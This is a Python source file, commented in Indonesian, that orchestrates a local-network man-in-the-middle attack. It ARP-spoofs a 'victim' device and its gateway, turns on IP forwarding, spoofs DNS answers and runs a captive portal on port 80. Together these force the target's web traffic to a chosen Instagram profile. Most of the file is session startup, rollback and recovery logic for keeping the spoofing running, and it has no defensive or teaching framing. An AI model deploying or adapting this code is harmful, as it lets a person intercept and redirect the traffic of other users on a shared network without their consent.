#!/usr/bin/env python3
"""
Redirect Session Manager
========================
Mengorkestrasikan sesi redirect per perangkat target:
- ARP Spoofing (dual-opcode L2 routing)
- DNS Spoofing (UDP 53 Walled Garden)
- Captive Portal HTTP Server (TCP 80 302 Redirect)
- Proteksi invariant: Gateway Immunity & Controller Self-Protection
"""

import threading
import time
from typing import Dict, Any, List, Literal, Optional, TypedDict
from ..spoofer import ARPSpoofer
from ..network import (
    get_network_info,
    set_ip_forwarding,
    is_valid_private_ip,
    is_valid_mac,
)
from .dns_spoofer import DNSSpoofer
from .portal_server import CaptivePortalServer
from ...utils.logger import logger
from ...exceptions.custom import SpoofError


class RedirectSnapshot(TypedDict, total=False):
    victim_ip: str
    victim_mac: str
    gateway_ip: str
    gateway_mac: str
    redirect_url: str
    instagram_username: str
    arp_session_id: Optional[str]
    dns_spoofer: Optional[DNSSpoofer]
    portal_server: Optional[CaptivePortalServer]
    portal_running: bool
    cleanup_arp_session_ids: List[str]
    started_at: Optional[float]


class ReplacementRecovery(TypedDict, total=False):
    kind: Literal["replacement_recovery"]
    status: Literal["recovery_pending"]
    victim_ip: str
    recovery_snapshot: RedirectSnapshot
    cleanup_session: Optional[Dict[str, Any]]
    restore_session: Dict[str, Any]
    resource_state: Dict[str, str]
    recovery_failed: bool
    recovery_error: str
    started_at: float


class RedirectManager:
    def __init__(self, spoofer: ARPSpoofer):
        self.spoofer = spoofer
        self.portal_server: Optional[CaptivePortalServer] = None
        self._sessions: Dict[str, Dict[str, Any]] = {}
        self._partial_sessions: Dict[str, Dict[str, Any]] = {}
        self._lock = threading.Lock()

    def _get_controller_ip_and_mac(self):
        info = get_network_info()
        my_ip = info.get("ip")
        my_mac = self.spoofer._self_mac
        if not my_ip or not my_mac:
            raise SpoofError("Gagal mendeteksi IP/MAC lokal komputer pengawas")
        return my_ip, my_mac

    def start_redirect(
        self,
        victim_ip: str,
        victim_mac: str,
        gateway_ip: str,
        gateway_mac: str,
        redirect_url: str,
        instagram_username: str = ""
    ) -> Dict[str, Any]:
        """Memulai sesi redirect Walled Garden ke akun Instagram untuk target IP."""
        if not is_valid_private_ip(victim_ip):
            raise SpoofError(f"Target IP {victim_ip} di luar jangkauan RFC 1918")
        if not is_valid_mac(victim_mac):
            raise SpoofError(f"Format MAC target '{victim_mac}' tidak valid")
        if not is_valid_private_ip(gateway_ip):
            raise SpoofError(f"Gateway IP {gateway_ip} di luar jangkauan RFC 1918")
        if not is_valid_mac(gateway_mac):
            raise SpoofError(f"Format MAC gateway '{gateway_mac}' tidak valid")

        my_ip, my_mac = self._get_controller_ip_and_mac()
        actual_gateway = get_network_info().get("gateway")
        normalized_victim_mac = victim_mac.lower().replace("-", ":")
        normalized_gateway_mac = gateway_mac.lower().replace("-", ":")
        normalized_self_mac = my_mac.lower().replace("-", ":")

        if victim_ip == my_ip or normalized_victim_mac == normalized_self_mac:
            raise SpoofError("Komputer pengawas (This PC) dilarang menjadi target redirect")
        if (
            victim_ip == gateway_ip
            or victim_ip == actual_gateway
            or normalized_victim_mac == normalized_gateway_mac
        ):
            raise SpoofError("Router Gateway dilarang menjadi target redirect")

        if not redirect_url.startswith("http://") and not redirect_url.startswith("https://"):
            redirect_url = f"https://www.instagram.com/{redirect_url.lstrip('@')}/"

        if not instagram_username and "instagram.com/" in redirect_url:
            parts = redirect_url.rstrip("/").split("instagram.com/")
            if len(parts) > 1:
                instagram_username = parts[1].split("/")[0].split("?")[0]

        with self._lock:
            if victim_ip in self._partial_sessions:
                partial = self._partial_sessions[victim_ip]
                if partial.get("kind") == "replacement_recovery":
                    self._attempt_recovery_unlocked(victim_ip, my_ip, my_mac)
                else:
                    self._stop_partial_session_unlocked(victim_ip)

            previous_snapshot = None
            if victim_ip in self._sessions:
                previous_snapshot = self._snapshot_session(
                    self._sessions[victim_ip]
                )
                self._teardown_for_replacement_unlocked(
                    victim_ip,
                    previous_snapshot,
                    my_ip,
                    my_mac,
                )

            start_args = {
                "victim_ip": victim_ip,
                "victim_mac": victim_mac,
                "gateway_ip": gateway_ip,
                "gateway_mac": gateway_mac,
                "redirect_url": redirect_url,
                "instagram_username": instagram_username,
                "my_ip": my_ip,
                "my_mac": my_mac,
            }
            try:
                return self._start_session_unlocked(**start_args)
            except Exception as startup_error:
                if previous_snapshot is None:
                    raise

                cleanup_session = None
                partial = self._partial_sessions.get(victim_ip)
                if partial and partial.get("kind") != "replacement_recovery":
                    try:
                        self._stop_partial_session_unlocked(victim_ip)
                    except SpoofError as cleanup_error:
                        cleanup_session = self._partial_sessions.pop(
                            victim_ip,
                            None,
                        )
                        self._create_recovery_record_unlocked(
                            victim_ip,
                            previous_snapshot,
                            cleanup_session=cleanup_session,
                            recovery_error=cleanup_error,
                        )
                        raise SpoofError(
                            f"Redirect replacement gagal: {startup_error}; "
                            f"recovery incomplete: {cleanup_error}"
                        ) from startup_error

                try:
                    self._create_recovery_record_unlocked(
                        victim_ip,
                        previous_snapshot,
                        cleanup_session=cleanup_session,
                    )
                    self._attempt_recovery_unlocked(victim_ip, my_ip, my_mac)
                except Exception as recovery_error:
                    raise SpoofError(
                        f"Redirect replacement gagal: {startup_error}; "
                        f"recovery incomplete: {recovery_error}"
                    ) from startup_error

                raise SpoofError(
                    f"Redirect replacement gagal: {startup_error}; "
                    "previous redirect restored"
                ) from startup_error

    def _snapshot_session(self, session: Dict[str, Any]) -> RedirectSnapshot:
        return {
            "victim_ip": session["victim_ip"],
            "victim_mac": session["victim_mac"],
            "gateway_ip": session["gateway_ip"],
            "gateway_mac": session["gateway_mac"],
            "redirect_url": session["redirect_url"],
            "instagram_username": session["instagram_username"],
            "arp_session_id": session.get("arp_session_id"),
            "dns_spoofer": session.get("dns_spoofer"),
            "portal_server": self.portal_server,
            "portal_running": bool(
                self.portal_server
                and getattr(self.portal_server, "_running", False)
            ),
            "cleanup_arp_session_ids": list(
                session.get("cleanup_arp_session_ids", [])
            ),
            "started_at": session.get("started_at"),
        }

    def _create_recovery_record_unlocked(
        self,
        victim_ip: str,
        recovery_snapshot: RedirectSnapshot,
        *,
        cleanup_session: Optional[Dict[str, Any]] = None,
        live_arp_session_id: Optional[str] = None,
        live_dns_spoofer: Optional[DNSSpoofer] = None,
        cleanup_arp_session_ids: Optional[List[str]] = None,
        resource_state: Optional[Dict[str, str]] = None,
        recovery_error: Optional[Exception] = None,
    ) -> ReplacementRecovery:
        recovery: ReplacementRecovery = {
            "kind": "replacement_recovery",
            "status": "recovery_pending",
            "victim_ip": victim_ip,
            "recovery_snapshot": recovery_snapshot,
            "cleanup_session": cleanup_session,
            "restore_session": {
                "arp_session_id": live_arp_session_id,
                "dns_spoofer": live_dns_spoofer,
                "cleanup_arp_session_ids": list(
                    cleanup_arp_session_ids
                    if cleanup_arp_session_ids is not None
                    else recovery_snapshot.get("cleanup_arp_session_ids", [])
                ),
            },
            "resource_state": resource_state or {
                "portal": "stopped",
                "arp": "stopped",
                "dns": "stopped",
            },
            "recovery_failed": recovery_error is not None,
            "recovery_error": str(recovery_error) if recovery_error else "",
            "started_at": time.time(),
        }
        self._partial_sessions[victim_ip] = recovery
        return recovery

    def _attempt_recovery_unlocked(
        self,
        victim_ip: str,
        my_ip: str,
        my_mac: str,
    ) -> Dict[str, Any]:
        recovery = self._partial_sessions.get(victim_ip)
        if not recovery or recovery.get("kind") != "replacement_recovery":
            raise SpoofError(
                f"Recovery redirect {victim_ip} tidak ditemukan"
            )

        snapshot = recovery["recovery_snapshot"]
        restore_session = recovery["restore_session"]
        resource_state = recovery["resource_state"]

        try:
            cleanup_session = recovery.get("cleanup_session")
            if cleanup_session:
                self._cleanup_session_unlocked(
                    victim_ip,
                    cleanup_session,
                    partial=True,
                )
                recovery["cleanup_session"] = None

            portal = self.portal_server
            if (
                portal is None
                or getattr(portal, "_running", False) is False
            ):
                portal = CaptivePortalServer(
                    port=80,
                    redirect_url=snapshot["redirect_url"],
                    instagram_username=snapshot["instagram_username"],
                )
                self.portal_server = portal
                portal.start()
            else:
                portal.update_target(
                    snapshot["redirect_url"],
                    snapshot["instagram_username"],
                )
            resource_state["portal"] = "live"

            arp_session_id = restore_session.get("arp_session_id")
            if not arp_session_id:
                arp_session_id = self.spoofer.start(
                    victim_ip=snapshot["victim_ip"],
                    victim_mac=snapshot["victim_mac"],
                    gateway_ip=snapshot["gateway_ip"],
                    gateway_mac=snapshot["gateway_mac"],
                    speed_limit=0,
                    is_redirect=True,
                )
                restore_session["arp_session_id"] = arp_session_id
            resource_state["arp"] = "live"

            if not set_ip_forwarding(
                True,
                self.spoofer._win_interface_name,
            ):
                raise SpoofError(
                    "Gagal mengaktifkan IP forwarding saat recovery redirect"
                )

            dns_spoofer = restore_session.get("dns_spoofer")
            if resource_state.get("dns") == "unknown" and dns_spoofer:
                dns_spoofer.stop()
                restore_session["dns_spoofer"] = None
                dns_spoofer = None
                resource_state["dns"] = "stopped"

            if not dns_spoofer:
                dns_spoofer = DNSSpoofer(
                    target_ip=snapshot["victim_ip"],
                    target_mac=snapshot["victim_mac"],
                    controller_ip=my_ip,
                    interface=self.spoofer._interface,
                    self_mac=my_mac,
                    gateway_ip=snapshot["gateway_ip"],
                )
                restore_session["dns_spoofer"] = dns_spoofer
                try:
                    dns_spoofer.start()
                except Exception:
                    resource_state["dns"] = "unknown"
                    raise
            resource_state["dns"] = "live"
        except Exception as recovery_error:
            recovery["status"] = "recovery_pending"
            recovery["recovery_failed"] = True
            recovery["recovery_error"] = str(recovery_error)
            raise SpoofError(
                f"Recovery redirect {victim_ip} belum selesai: {recovery_error}"
            ) from recovery_error

        session_data = {
            "victim_ip": snapshot["victim_ip"],
            "victim_mac": snapshot["victim_mac"],
            "gateway_ip": snapshot["gateway_ip"],
            "gateway_mac": snapshot["gateway_mac"],
            "redirect_url": snapshot["redirect_url"],
            "instagram_username": snapshot["instagram_username"],
            "arp_session_id": restore_session["arp_session_id"],
            "dns_spoofer": restore_session["dns_spoofer"],
            "cleanup_arp_session_ids": list(
                restore_session.get("cleanup_arp_session_ids", [])
            ),
            "started_at": snapshot.get("started_at") or time.time(),
        }
        self._sessions[victim_ip] = session_data
        self._partial_sessions.pop(victim_ip, None)
        return session_data

    def _teardown_for_replacement_unlocked(
        self,
        victim_ip: str,
        snapshot: RedirectSnapshot,
        my_ip: str,
        my_mac: str,
    ):
        session = self._sessions[victim_ip]
        cleanup_arp_session_ids = list(
            session.get("cleanup_arp_session_ids", [])
        )

        for stale_session_id in list(cleanup_arp_session_ids):
            try:
                self.spoofer.stop(stale_session_id)
            except Exception as teardown_error:
                raise SpoofError(
                    f"Gagal membersihkan redirect {victim_ip}: "
                    f"ARP cleanup failed: {teardown_error}"
                ) from teardown_error
            cleanup_arp_session_ids.remove(stale_session_id)
        session["cleanup_arp_session_ids"] = cleanup_arp_session_ids

        dns_spoofer = session.get("dns_spoofer")
        if dns_spoofer:
            try:
                dns_spoofer.stop()
            except Exception as teardown_error:
                dns_is_live = (
                    getattr(dns_spoofer, "_running", None) is not False
                )
                return self._restore_after_teardown_failure_unlocked(
                    victim_ip,
                    snapshot,
                    teardown_error,
                    my_ip,
                    my_mac,
                    live_arp_session_id=session.get("arp_session_id"),
                    live_dns_spoofer=dns_spoofer if dns_is_live else None,
                    cleanup_arp_session_ids=cleanup_arp_session_ids,
                    resource_state={
                        "portal": "live",
                        "arp": "live",
                        "dns": "live" if dns_is_live else "stopped",
                    },
                )
            session["dns_spoofer"] = None

        arp_session_id = session.get("arp_session_id")
        if arp_session_id:
            try:
                self.spoofer.stop(arp_session_id)
            except Exception as teardown_error:
                cleanup_arp_session_ids.append(arp_session_id)
                session["arp_session_id"] = None
                return self._restore_after_teardown_failure_unlocked(
                    victim_ip,
                    snapshot,
                    teardown_error,
                    my_ip,
                    my_mac,
                    cleanup_arp_session_ids=cleanup_arp_session_ids,
                    resource_state={
                        "portal": "live",
                        "arp": "stopped",
                        "dns": "stopped",
                    },
                )
            session["arp_session_id"] = None

        other_sessions = any(
            ip != victim_ip
            for ip in self._sessions
        ) or bool(self._partial_sessions)
        if not other_sessions and self.portal_server:
            portal = self.portal_server
            try:
                portal.stop()
            except Exception as teardown_error:
                portal_is_live = (
                    getattr(portal, "_running", None) is not False
                )
                if not portal_is_live and self.portal_server is portal:
                    self.portal_server = None
                return self._restore_after_teardown_failure_unlocked(
                    victim_ip,
                    snapshot,
                    teardown_error,
                    my_ip,
                    my_mac,
                    cleanup_arp_session_ids=cleanup_arp_session_ids,
                    resource_state={
                        "portal": "live" if portal_is_live else "stopped",
                        "arp": "stopped",
                        "dns": "stopped",
                    },
                )
            if self.portal_server is portal:
                self.portal_server = None

        self._sessions.pop(victim_ip, None)
        logger.info(
            f"🏁 [Redirect Manager] Sesi redirect untuk {victim_ip} dihentikan."
        )

    def _restore_after_teardown_failure_unlocked(
        self,
        victim_ip: str,
        snapshot: RedirectSnapshot,
        teardown_error: Exception,
        my_ip: str,
        my_mac: str,
        *,
        live_arp_session_id: Optional[str] = None,
        live_dns_spoofer: Optional[DNSSpoofer] = None,
        cleanup_arp_session_ids: Optional[List[str]] = None,
        resource_state: Dict[str, str],
    ):
        self._sessions.pop(victim_ip, None)
        self._create_recovery_record_unlocked(
            victim_ip,
            snapshot,
            live_arp_session_id=live_arp_session_id,
            live_dns_spoofer=live_dns_spoofer,
            cleanup_arp_session_ids=cleanup_arp_session_ids,
            resource_state=resource_state,
            recovery_error=teardown_error,
        )
        try:
            self._attempt_recovery_unlocked(victim_ip, my_ip, my_mac)
        except SpoofError as recovery_error:
            raise SpoofError(
                f"Redirect replacement teardown gagal: {teardown_error}; "
                f"recovery incomplete: {recovery_error}"
            ) from teardown_error
        raise SpoofError(
            f"Redirect replacement teardown gagal: {teardown_error}; "
            "previous redirect restored"
        ) from teardown_error

    def _start_session_unlocked(
        self,
        *,
        victim_ip: str,
        victim_mac: str,
        gateway_ip: str,
        gateway_mac: str,
        redirect_url: str,
        instagram_username: str,
        my_ip: str,
        my_mac: str,
    ) -> Dict[str, Any]:
        interface = self.spoofer._interface
        portal_started = False
        portal_restore_target = None
        arp_session_id = None
        dns_spoofer = None

        try:
            if not self.portal_server or not self.portal_server._running:
                self.portal_server = CaptivePortalServer(
                    port=80,
                    redirect_url=redirect_url,
                    instagram_username=instagram_username
                )
                portal_started = True
                self.portal_server.start()
            else:
                portal_restore_target = (
                    self.portal_server.redirect_url,
                    self.portal_server.instagram_username,
                )
                self.portal_server.update_target(redirect_url, instagram_username)

            arp_session_id = self.spoofer.start(
                victim_ip=victim_ip,
                victim_mac=victim_mac,
                gateway_ip=gateway_ip,
                gateway_mac=gateway_mac,
                speed_limit=0,
                is_redirect=True
            )

            if not set_ip_forwarding(True, self.spoofer._win_interface_name):
                raise SpoofError("Gagal mengaktifkan IP forwarding untuk redirect")

            dns_spoofer = DNSSpoofer(
                target_ip=victim_ip,
                target_mac=victim_mac,
                controller_ip=my_ip,
                interface=interface,
                self_mac=my_mac,
                gateway_ip=gateway_ip
            )
            dns_spoofer.start()
        except Exception as startup_error:
            partial_session = {
                "victim_ip": victim_ip,
                "victim_mac": victim_mac,
                "gateway_ip": gateway_ip,
                "gateway_mac": gateway_mac,
                "redirect_url": redirect_url,
                "instagram_username": instagram_username,
                "arp_session_id": arp_session_id,
                "dns_spoofer": dns_spoofer,
                "portal_restore_target": portal_restore_target,
                "stop_portal_when_clean": portal_started,
                "started_at": time.time(),
            }
            self._partial_sessions[victim_ip] = partial_session
            try:
                self._stop_partial_session_unlocked(victim_ip)
            except SpoofError as rollback_error:
                raise SpoofError(
                    f"Redirect startup gagal: {startup_error}; "
                    f"rollback belum selesai: {rollback_error}"
                ) from startup_error
            raise

        session_data = {
            "victim_ip": victim_ip,
            "victim_mac": victim_mac,
            "gateway_ip": gateway_ip,
            "gateway_mac": gateway_mac,
            "redirect_url": redirect_url,
            "instagram_username": instagram_username,
            "arp_session_id": arp_session_id,
            "dns_spoofer": dns_spoofer,
            "started_at": time.time()
        }
        self._sessions[victim_ip] = session_data

        logger.info(f"✨ [Redirect Manager] Sesi redirect aktif untuk {victim_ip} -> {redirect_url}")

        return {
            "victim_ip": victim_ip,
            "redirect_url": redirect_url,
            "instagram_username": instagram_username,
            "arp_session_id": arp_session_id
        }

    def _stop_session_unlocked(self, victim_ip: str):
        """Hentikan satu sesi tanpa mengambil lock lagi (internal)."""
        session = self._sessions.get(victim_ip)
        if not session:
            return

        self._cleanup_session_unlocked(victim_ip, session, partial=False)
        self._sessions.pop(victim_ip, None)
        logger.info(f"🏁 [Redirect Manager] Sesi redirect untuk {victim_ip} dihentikan.")

    def _stop_partial_session_unlocked(self, victim_ip: str):
        """Retry cleanup resources retained from a failed redirect startup."""
        session = self._partial_sessions.get(victim_ip)
        if not session:
            return

        if session.get("kind") == "replacement_recovery":
            self._abandon_recovery_unlocked(victim_ip, session)
            self._partial_sessions.pop(victim_ip, None)
            return

        self._cleanup_session_unlocked(victim_ip, session, partial=True)
        self._partial_sessions.pop(victim_ip, None)

    def _abandon_recovery_unlocked(
        self,
        victim_ip: str,
        recovery: ReplacementRecovery,
    ):
        errors = []
        for key in ("cleanup_session", "restore_session"):
            retained = recovery.get(key)
            if not retained:
                continue
            retained["stop_portal_when_clean"] = False
            try:
                self._cleanup_session_unlocked(
                    victim_ip,
                    retained,
                    partial=True,
                )
            except SpoofError as error:
                errors.append(str(error))

        other_sessions = any(
            candidate is not recovery
            for sessions in (self._sessions, self._partial_sessions)
            for candidate in sessions.values()
        )
        if not errors and not other_sessions and self.portal_server:
            portal = self.portal_server
            try:
                portal.stop()
            except Exception as error:
                errors.append(f"Portal cleanup failed: {error}")
            else:
                if self.portal_server is portal:
                    self.portal_server = None

        if errors:
            recovery["recovery_failed"] = True
            recovery["recovery_error"] = "; ".join(errors)
            raise SpoofError("; ".join(errors))

    def _cleanup_session_unlocked(
        self,
        victim_ip: str,
        session: Dict[str, Any],
        *,
        partial: bool,
    ):
        errors = []

        dns = session.get("dns_spoofer")
        if dns:
            try:
                dns.stop()
            except Exception as e:
                errors.append(f"DNS cleanup failed: {e}")
            else:
                session["dns_spoofer"] = None

        arp_sid = session.get("arp_session_id")
        if arp_sid:
            try:
                self.spoofer.stop(arp_sid)
            except Exception as e:
                errors.append(f"ARP cleanup failed: {e}")
            else:
                session["arp_session_id"] = None

        remaining_arp_sessions = []
        for stale_session_id in session.get("cleanup_arp_session_ids", []):
            try:
                self.spoofer.stop(stale_session_id)
            except Exception as e:
                errors.append(f"ARP cleanup failed: {e}")
                remaining_arp_sessions.append(stale_session_id)
        session["cleanup_arp_session_ids"] = remaining_arp_sessions

        portal_restore_target = session.get("portal_restore_target")
        if portal_restore_target and self.portal_server:
            try:
                self.portal_server.update_target(*portal_restore_target)
            except Exception as e:
                errors.append(f"Portal target restore failed: {e}")
            else:
                session["portal_restore_target"] = None

        other_sessions = any(
            candidate is not session
            for sessions in (self._sessions, self._partial_sessions)
            for candidate in sessions.values()
        )
        should_stop_portal = session.get("stop_portal_when_clean", not partial)
        if (
            not errors
            and should_stop_portal
            and not other_sessions
            and self.portal_server
        ):
            portal = self.portal_server
            try:
                portal.stop()
            except Exception as e:
                errors.append(f"Portal cleanup failed: {e}")
            else:
                if self.portal_server is portal:
                    self.portal_server = None
                session["stop_portal_when_clean"] = False

        if errors:
            raise SpoofError(
                f"Gagal membersihkan redirect {victim_ip}: {'; '.join(errors)}"
            )

    def stop_redirect(self, victim_ip: str):
        """Hentikan sesi redirect untuk target IP."""
        with self._lock:
            if (
                victim_ip not in self._sessions
                and victim_ip not in self._partial_sessions
            ):
                logger.warning(f"Sesi redirect {victim_ip} tidak ditemukan.")
                return False

            errors = []
            if victim_ip in self._sessions:
                try:
                    self._stop_session_unlocked(victim_ip)
                except SpoofError as e:
                    errors.append(str(e))
            if victim_ip in self._partial_sessions:
                try:
                    self._stop_partial_session_unlocked(victim_ip)
                except SpoofError as e:
                    errors.append(str(e))

            if errors:
                raise SpoofError("; ".join(errors))
            return True

    def stop_all(self):
        """Hentikan semua sesi redirect yang aktif."""
        with self._lock:
            errors = []
            victim_ips = list(self._sessions.keys())
            for ip in victim_ips:
                try:
                    self._stop_session_unlocked(ip)
                except SpoofError as e:
                    errors.append(str(e))

            partial_ips = list(self._partial_sessions.keys())
            for ip in partial_ips:
                try:
                    self._stop_partial_session_unlocked(ip)
                except SpoofError as e:
                    errors.append(str(e))

            if (
                not errors
                and not self._sessions
                and not self._partial_sessions
                and self.portal_server
            ):
                portal = self.portal_server
                try:
                    portal.stop()
                except Exception as e:
                    errors.append(f"Portal cleanup failed: {e}")
                else:
                    if self.portal_server is portal:
                        self.portal_server = None

            if errors:
                raise SpoofError("; ".join(errors))

    def get_sessions(self) -> Dict[str, Any]:
        """Dapatkan ringkasan seluruh sesi redirect yang aktif."""
        with self._lock:
            result = {}
            for ip, sess in self._sessions.items():
                result[ip] = {
                    "victim_ip": sess["victim_ip"],
                    "victim_mac": sess["victim_mac"],
                    "gateway_ip": sess["gateway_ip"],
                    "redirect_url": sess["redirect_url"],
                    "instagram_username": sess["instagram_username"],
                    "started_at": sess["started_at"]
                }
            return result
